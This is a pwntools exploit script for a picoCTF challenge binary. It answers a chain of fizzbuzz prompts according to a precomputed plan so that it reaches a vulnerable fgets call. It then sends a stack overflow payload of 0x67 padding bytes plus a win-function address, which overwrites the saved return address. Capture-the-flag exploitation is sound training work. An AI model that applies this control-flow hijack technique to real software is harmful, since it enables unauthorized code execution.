#!/usr/bin/env python3
from pwn import *

PORT = 56319
HOST = "wily-courier.picoctf.net"

elf = context.binary = ELF('./vuln', checksec=False)
context.log_level = 'debug'

WIN = 0x08048656
OFFSET = 0x67  # buf = ebp-0x63, saved_eip = ebp+4

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b *0x0808aeb0
            b *0x08048656
            c
            set follow-fork-mode parent
        ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

def fizzbuzz(i):
    if i % 15 == 0:
        return b"fizzbuzz"
    if i % 3 == 0:
        return b"fizz"
    if i % 5 == 0:
        return b"buzz"
    return str(i).encode()

def answer(x):
    p.sendlineafter(b"? ", x)

# Each tuple is: (validator_limit, desired_return)
# desired_return == limit  => answer all questions correctly
# desired_return < limit   => answer correctly until desired_return-1, then fail
PLAN = [
    (4, 4), (7, 7), (2, 2), (9, 9), (12, 12), (3, 3), (12, 12), (4, 4),
    (7, 7), (13, 13), (12, 12), (18, 18), (15, 15), (3, 3), (12, 12), (16, 16),
    (14, 14), (9, 9), (12, 12), (16, 16), (13, 13), (17, 17), (6, 6), (14, 14),
    (7, 7), (10, 10), (15, 15), (13, 13), (7, 7), (8, 8), (13, 13), (17, 17),
    (11, 11), (18, 18), (11, 11), (11, 1), (7, 7), (10, 1), (13, 13), (18, 1),
    (15, 15), (17, 1), (7, 7), (8, 1), (7, 7), (4, 1), (16, 16), (13, 1),
    (16, 16), (14, 1), (10, 10), (13, 1), (17, 1), (2, 2), (5, 1), (6, 1),
    (3, 3), (15, 1), (17, 17), (18, 1), (13, 13), (18, 1), (5, 5), (11, 1),
    (7, 7), (13, 1), (3, 3), (9, 1), (7, 7), (18, 1), (7, 7), (6, 1),
    (6, 6), (2, 1), (4, 4), (8, 1), (12, 12), (6, 1), (13, 13), (4, 1),
    (5, 5), (18, 1), (7, 7), (4, 1), (13, 13), (12, 1), (2, 2), (17, 1),
    (12, 12), (15, 1), (11, 11), (16, 1), (9, 9), (4, 1), (14, 14), (7, 1),
    (4, 4), (7, 1), (5, 5), (2, 1), (46, 5), (20, 1),
]

def drive_plan():
    # Handle every validator except the last one normally.
    for limit, ret in PLAN[:-1]:
        for i in range(1, ret):
            answer(fizzbuzz(i))

        if ret < limit:
            answer(b"x")

    # Last validator: ret = 1, then vulnerable fgets is reached.
    # Important: do NOT send a newline here.
    final_limit, final_ret = PLAN[-1]

    p.sendafter(b"? ", b"XXXXXXXXX")

p = conn()

# GDB()

drive_plan()

payload = flat(
    b"A" * OFFSET,
    p32(WIN)
)

p.sendline(payload)

p.interactive()
